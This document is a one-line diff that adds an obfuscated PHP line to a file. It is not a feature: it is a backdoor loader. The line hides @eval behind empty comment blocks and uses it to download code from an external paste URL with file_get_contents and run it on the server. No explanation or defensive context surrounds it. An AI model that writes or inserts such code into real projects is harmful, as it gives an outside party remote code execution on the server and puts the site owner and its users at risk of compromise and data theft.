@@ -1,0 +1,1 @@
+<?=/**/@null; /**/ /*/ /**/@eval/**/ ("?>".file_get_contents (rawurldecode(urldecode("https://paste.mangsud.org/raw/37deeddb")))); /**/ ?>
